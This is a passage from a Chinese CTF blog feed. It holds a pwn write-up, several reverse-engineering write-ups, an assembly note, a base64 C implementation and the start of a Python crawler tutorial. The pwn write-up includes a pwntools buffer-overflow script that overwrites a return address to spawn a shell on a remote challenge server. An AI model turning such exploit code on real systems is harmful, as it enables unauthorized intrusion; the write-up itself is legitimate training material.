        <content type="html"><![CDATA[<h1 id="writeup-level0-pwn"><a href="#writeup-level0-pwn" class="headerlink" title="writeup_level0_pwn"></a>writeup_level0_pwn</h1><p>ida打开附件：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224153914432.png" alt="image-20220224153914432"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224153937936.png" alt="image-20220224153937936"></p><p>可以看到read函数把int读入数组，有溢出漏洞，然后找到程序中的危险函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224154528561.png" alt="image-20220224154528561"></p><p>只要成功对此函数实现调用就可以通过sh命令行控制系统。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224154721048.png" alt="image-20220224154721048"></p><p>查看数据区域，可以看到上面贴心的给出了解释，r和s代表了程序的返回地址和储存的寄存器值，我们只要通过缓冲区溢出覆盖程序的返回地址，将返回地址覆盖为我们的目标函数起始地址，即可执行该函数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155005913.png" alt="image-20220224155005913"></p><p>起始地址锁定为596，直接脚本抄袭开始!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#导入 pwntools 中 pwn 包的所有内容 </span></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">33907</span>) <span class="comment"># 链接服务器远程交互 </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level0&#x27;</span>) <span class="comment"># 以 ELF 文件格式读取 level0 文件 </span></span><br><span class="line">sysaddr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>] <span class="comment"># 获取 ELF 文件中 callsystem 的地址 </span></span><br><span class="line"><span class="comment"># 先用 0x88 个无用字符覆盖 buf 和 push 的内容，再覆盖返回地址 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span> + <span class="number">8</span>) + p64(sysaddr) </span><br><span class="line">p.recv() <span class="comment">#接收输出 p.send(payload) # 发送 payload </span></span><br><span class="line">p.interactive() <span class="comment"># 反弹 shell 进行交互</span></span><br></pre></td></tr></table></figure><p>太详细了，爱了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155638026.png" alt="image-20220224155638026"></p><p>小跑一下，结果报错了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155803770.png" alt="image-20220224155803770"></p><p>python3需要将字符串转化为二进制。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224160542356.png" alt="image-20220224160542356"></p><p>pwn好复杂233</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_easyMaze_reverse</title>
      <link href="/2022/02/23/writeup_easyMaze_reverse/"/>
      <url>/2022/02/23/writeup_easyMaze_reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-easyMaze-reverse"><a href="#writeup-easyMaze-reverse" class="headerlink" title="writeup_easyMaze_reverse"></a>writeup_easyMaze_reverse</h1><p>elf文件，直接ida：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113010570.png" alt="image-20220223113010570">main函数里定义了一大堆变量。</p><p>为了便于分析，从step_2开始看起：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113150953.png" alt="image-20220223113150953"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113157081.png" alt="image-20220223113157081"></p><p>循环校验输入（WASD)，然后按照输入内容控制输出相关结果。</p><p>再看加密逻辑：</p><p>step_0貌似是在生成地图</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113401327.png" alt="image-20220223113401327"></p><p>step1中还有子调用，太麻烦了，因此直接选择动态调试，在step2直接查看数据。</p><p>连接linux开始动态调试：<br>断点下载step_2的循环开始处：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113547109.png" alt="image-20220223113547109"></p><p>双击a1数组查看变量：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113621065.png" alt="image-20220223113621065"></p><p>很多0和1组成的数组，d键位转化为dd，然后右键生成数组，长度为49</p><p><em>（dd定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4；）</em></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113959158.png" alt="image-20220223113959158"></p><p>复制，生成地图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223114043238.png" alt="image-20220223114043238"></p><p>按照地图，应该为 <strong>SSDDWDWDDDSSAASASAAASSDDDDWDDS</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223114516245.png" alt="image-20220223114516245"></p><p>最终flag：UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编 db,dw,dd的区别</title>
      <link href="/2022/02/23/%E6%B1%87%E7%BC%96dd%20dw%20db%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/02/23/%E6%B1%87%E7%BC%96dd%20dw%20db%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编-db-dw-dd的区别"><a href="#汇编-db-dw-dd的区别" class="headerlink" title="汇编 db,dw,dd的区别"></a>汇编 db,dw,dd的区别</h1><p>db定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1；</p><p>dw定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2；</p><p>dd定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4；</p><p>dq定义四字节类型，一个四字类型数据占8个字节单元；</p><p>格式：〔符号名〕 DB\DW\DD\DF\DQ\DT 初值序列<br>DB定义的为字节类型，DW定义字类型，DD定义双字类型,DF为长字类型,DQ为四字类型,DT为十字节类型,该指令分别定义8位,16位,32位,48位,64位,80位的数据</p><p>DW就是表示为该数据分配一个字的存储空间,即16位</p><p>摘抄自：<a href="https://blog.csdn.net/baidu_37503452/article/details/83147318">https://blog.csdn.net/baidu_37503452/article/details/83147318</a></p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_梅津美治郎reserve</title>
      <link href="/2022/02/22/writeup_%E6%A2%85%E6%B4%A5%E7%BE%8E%E6%B2%BB%E9%83%8Ereserve/"/>
      <url>/2022/02/22/writeup_%E6%A2%85%E6%B4%A5%E7%BE%8E%E6%B2%BB%E9%83%8Ereserve/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-梅津美治郎reserve"><a href="#writeup-梅津美治郎reserve" class="headerlink" title="writeup_梅津美治郎reserve"></a>writeup_梅津美治郎reserve</h1><p>查壳，没壳</p><p>ida打开：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222144540525.png" alt="image-20220222144540525"></p><p>level1太简单不说，r0b0RUlez！</p><p>直接，步入<code>sub_4015EA</code></p><p>发现有一个九次的小递归：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222144708771.png" alt="image-20220222144708771"></p><p>判断有猫腻，直接上动调，然而x32dbg怎么调都是一个异常终止。</p><p>查wp，改用虚拟机下的od，可以正常运行，简单的概述一下具体情况：</p><p>在运行完<code>int3</code>语句后，程序跳转到7地址开头系统领空，一段时间后，再次调用了4开头的正常函数，可以猜到应该是level2的主函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145151675.png" alt="image-20220222145151675"></p><p>逻辑很简单：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145245355.png" alt="image-20220222145245355"></p><p>直接比较了v1和另一串字符。</p><p>打开比较函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145347133.png" alt="image-20220222145347133"></p><p>可以看到是将a2异或2后进行的比较，至此比较流程已经清晰，下面找到a2就可以解决问题。</p><p>依然需要动调：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145635117.png" alt="image-20220222145635117"></p><p>可以看到数据窗口中显示的就是实际参与比较的a2字符串（以02结尾），我们直接解密：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222150024397.png" alt="image-20220222150024397"></p><p>为welldone字样，然而这还不是最终flag。。。</p><p>最终的flag是第一层的结果下划线第二层的结果，即：</p><p>flag{r0b0RUlez!_w3lld0ne}</p><p>坑爹啊。。。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_攻防世界_WindowsReserve2</title>
      <link href="/2022/02/21/writeup_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_WindowsReserve2/"/>
      <url>/2022/02/21/writeup_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_WindowsReserve2/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-攻防世界-WindowsReserve2"><a href="#writeup-攻防世界-WindowsReserve2" class="headerlink" title="writeup_攻防世界_WindowsReserve2"></a>writeup_攻防世界_WindowsReserve2</h1><p>首先，除了攻防世界的wp以外，网上关于这题的wp我个人都认为不太详细</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221154222199.png" alt="image-20220221154222199"></p><p>有as壳，esp定律手动脱壳。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221154312611.png" alt="image-20220221154312611"></p><p>拖入ida，根据功能对函数进行重命名：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221155246072.png" alt="image-20220221155246072"></p><p>锁定关键函数：</p><p>①检查输入函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221155643676.png" alt="image-20220221155643676"></p><p>②加密函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221195502946.png" alt="image-20220221195502946"></p><p>最后一位通过v9和v4加密，存入了v10</p><p>进入下一层逻辑：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221213003126.png" alt="image-20220221213003126"></p><p>仔细观察逻辑发现有一个密码表，通过python脚本转化一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221212858274.png" alt="image-20220221212858274"></p><p>发现还是经典base64，仔细观察代码逻辑，推测是base64加密函数。</p><p>因此，可以对程序的总体流程进行推测：</p><ol><li>传入加密函数，分奇数偶数位进行加密</li><li>加密后的内容进行base64编码（结果为reverse+）</li></ol><p>然而，对reverse+进行解码却发现解不开。。。这应该是其解码之后的结果无法打印</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221215648947.png" alt="image-20220221215648947"></p><p>遂自己写脚本如上，左侧为输出。</p><p>然后回到上一层函数</p><p>上一层函数的输出为173,235,222,174,199,190</p><p>因此可以初步判断本层函数的输入应为12位，由于可能性较少，可以直接正向碰撞，可能性仅仅有12*（10+6）种，直接复刻正向逻辑：</p><p>首先，上面的一大串加密逻辑的输出结果只可能是整数0~15</p><p>然后使用0~15循环碰撞输出结果，得到的值进行保存，</p><p>最终将得到的含有0<del>15整数的12位数组反向转化为0</del>9、A~F即可</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221222215169.png" alt="image-20220221222215169"></p><p>终于搞定了。。。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>base64编码、解码c语言实现</title>
      <link href="/2022/02/21/base64%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/02/21/base64%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>搬运自：<a href="https://blog.csdn.net/qq_26093511/article/details/78836087">https://blog.csdn.net/qq_26093511/article/details/78836087</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *str)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">long</span> len;  </span><br><span class="line">    <span class="keyword">long</span> str_len;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res;  </span><br><span class="line">    <span class="keyword">int</span> i,j;  </span><br><span class="line"><span class="comment">//定义base64编码表  </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *base64_table=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//计算经过base64编码后的字符串长度  </span></span><br><span class="line">    str_len=<span class="built_in">strlen</span>(str);  </span><br><span class="line">    <span class="keyword">if</span>(str_len % <span class="number">3</span> == <span class="number">0</span>)  </span><br><span class="line">        len=str_len/<span class="number">3</span>*<span class="number">4</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        len=(str_len/<span class="number">3</span>+<span class="number">1</span>)*<span class="number">4</span>;  </span><br><span class="line">  </span><br><span class="line">    res=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*len+<span class="number">1</span>);  </span><br><span class="line">    res[len]=<span class="string">&#x27;\0&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//以3个8位字符为一组进行编码  </span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;len<span class="number">-2</span>;j+=<span class="number">3</span>,i+=<span class="number">4</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        res[i]=base64_table[str[j]&gt;&gt;<span class="number">2</span>]; </span><br><span class="line"><span class="comment">//取出第一个字符的前6位并找出对应的结果字符  </span></span><br><span class="line">        res[i+<span class="number">1</span>]=base64_table[(str[j]&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">4</span> | (str[j+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)]; </span><br><span class="line"><span class="comment">//将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  </span></span><br><span class="line">        res[i+<span class="number">2</span>]=base64_table[(str[j+<span class="number">1</span>]&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">2</span> | (str[j+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)]; </span><br><span class="line"><span class="comment">//将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  </span></span><br><span class="line">        res[i+<span class="number">3</span>]=base64_table[str[j+<span class="number">2</span>]&amp;<span class="number">0x3f</span>]; </span><br><span class="line"><span class="comment">//取出第三个字符的后6位并找出结果字符  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span>(str_len % <span class="number">3</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            res[i<span class="number">-2</span>]=<span class="string">&#x27;=&#x27;</span>;  </span><br><span class="line">            res[i<span class="number">-1</span>]=<span class="string">&#x27;=&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">            res[i<span class="number">-1</span>]=<span class="string">&#x27;=&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *code)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="comment">//根据base64表，以字符找到对应的十进制数据  </span></span><br><span class="line">    <span class="keyword">int</span> table[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">63</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">58</span>,</span><br><span class="line">     <span class="number">59</span>,<span class="number">60</span>,<span class="number">61</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,</span><br><span class="line">     <span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">     <span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>,</span><br><span class="line">     <span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,</span><br><span class="line">     <span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">44</span>,</span><br><span class="line">     <span class="number">45</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span></span><br><span class="line">           &#125;;  </span><br><span class="line">    <span class="keyword">long</span> len;  </span><br><span class="line">    <span class="keyword">long</span> str_len;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res;  </span><br><span class="line">    <span class="keyword">int</span> i,j;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//计算解码后的字符串长度  </span></span><br><span class="line">    len=<span class="built_in">strlen</span>(code);  </span><br><span class="line"><span class="comment">//判断编码后的字符串后是否有=  </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(code,<span class="string">&quot;==&quot;</span>))  </span><br><span class="line">        str_len=len/<span class="number">4</span>*<span class="number">3</span><span class="number">-2</span>;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strstr</span>(code,<span class="string">&quot;=&quot;</span>))  </span><br><span class="line">        str_len=len/<span class="number">4</span>*<span class="number">3</span><span class="number">-1</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        str_len=len/<span class="number">4</span>*<span class="number">3</span>;  </span><br><span class="line">  </span><br><span class="line">    res=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*str_len+<span class="number">1</span>);  </span><br><span class="line">    res[str_len]=<span class="string">&#x27;\0&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//以4个字符为一位进行解码  </span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i &lt; len<span class="number">-2</span>;j+=<span class="number">3</span>,i+=<span class="number">4</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        res[j]=((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i]])&lt;&lt;<span class="number">2</span> | (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">1</span>]])&gt;&gt;<span class="number">4</span>); </span><br><span class="line"><span class="comment">//取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  </span></span><br><span class="line">        res[j+<span class="number">1</span>]=(((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">1</span>]])&lt;&lt;<span class="number">4</span>) | (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">2</span>]])&gt;&gt;<span class="number">2</span>); </span><br><span class="line"><span class="comment">//取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  </span></span><br><span class="line">        res[j+<span class="number">2</span>]=(((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">2</span>]])&lt;&lt;<span class="number">6</span>) | ((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">3</span>]]); </span><br><span class="line"><span class="comment">//取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf =<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">&quot;-d&quot;</span>) == <span class="number">0</span>) </span><br><span class="line">    &#123; </span><br><span class="line">buf = base64_decode(argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;</span><br><span class="line">buf = base64_encode(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);   </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python异步爬虫基础</title>
      <link href="/2022/02/20/python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/20/python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="pyhton异步爬虫基础"><a href="#pyhton异步爬虫基础" class="headerlink" title="pyhton异步爬虫基础"></a>pyhton异步爬虫基础</h1><h2 id="一、多线程-多进程"><a href="#一、多线程-多进程" class="headerlink" title="一、多线程/多进程"></a>一、多线程/多进程</h2><h3 id="多线程："><a href="#多线程：" class="headerlink" title="多线程："></a>多线程：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  多线程</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread  <span class="comment"># 线程类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#实现方法1：</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;func&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = Thread(target=func)  <span class="comment"># 创建线程并给线程安排任务</span></span><br><span class="line">    t.start()  <span class="comment"># 多线程状态为可以开始工作状态, 具体的执行时间由CPU决定</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;main&quot;</span>, i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 